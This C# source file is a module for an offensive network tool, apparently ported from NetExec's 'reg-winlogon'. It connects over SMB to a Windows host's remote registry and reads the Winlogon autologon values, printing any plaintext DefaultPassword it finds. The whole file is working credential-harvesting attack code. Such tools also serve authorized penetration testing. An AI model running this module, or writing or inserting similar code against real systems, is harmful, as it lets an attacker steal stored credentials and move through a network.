using Titanis;
using Titanis.DceRpc.Client;
using Titanis.Msrpc;
using Titanis.Msrpc.Msrrp;
using Titanis.Smb2;
using Titanis.Winterop.Registry;
using Titanis.Winterop.Security;

namespace Atlas.Protocols.Smb.Modules;

/// <summary>
/// NetExec reg-winlogon: reads Winlogon autologon credentials.
/// </summary>
public sealed class SmbRegWinlogonModule : AtlasModule<Smb2Client>
{
	public override string Name => "reg-winlogon";
	public override string Description => "Reads Winlogon autologon credentials (DefaultUserName/DefaultPassword)";

	private static readonly string[] Names = new[] { "AutoAdminLogon", "DefaultDomainName", "DefaultUserName", "DefaultPassword" };

	public override async Task RunAsync(AtlasModuleContext<Smb2Client> ctx, CancellationToken cancellationToken)
	{
		try
		{
			RpcClient rpc = ctx.Services.CreateRpcClient();
			using RemoteRegistryClient reg = new RemoteRegistryClient();
			await rpc.ConnectPipe(reg, ctx.Client, new UncPath(ctx.Host, Smb2Client.IpcName, reg.WellKnownPipeName ?? "winreg"), cancellationToken).ConfigureAwait(false);
			await using var lm = await reg.OpenLocalMachine(RegistryAccessRights.KeyRead, cancellationToken).ConfigureAwait(false);
			await using var key = await lm.OpenSubkey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", RegistryAccessRights.KeyRead, RegistryKeyOptions.None, cancellationToken).ConfigureAwait(false);
			bool found = false;
			foreach (var name in Names)
			{
				string val = string.Empty;
				try
				{
					var v = await key.GetValue(name, cancellationToken).ConfigureAwait(false);
					val = v.TypedValue?.ToString() ?? (v.Bytes is not null ? System.Text.Encoding.Unicode.GetString(v.Bytes).TrimEnd('\0') : string.Empty);
				}
				catch { }
				if (!string.IsNullOrEmpty(val)) found = true;
				if (name == "DefaultPassword" && !string.IsNullOrEmpty(val))
					AtlasConsole.Success($"{ctx.Host}:445", $"(reg-winlogon) {name}: {val}");
				else
					AtlasConsole.Info($"{ctx.Host}:445", $"(reg-winlogon) {name}: {val}");
			}
			if (!found)
				AtlasConsole.Info($"{ctx.Host}:445", "(reg-winlogon) no autologon credentials found");
		}
		catch (Exception ex)
		{
			AtlasConsole.Fail($"{ctx.Host}:445", $"(reg-winlogon) Failed: {ex.Message}");
		}
	}
}
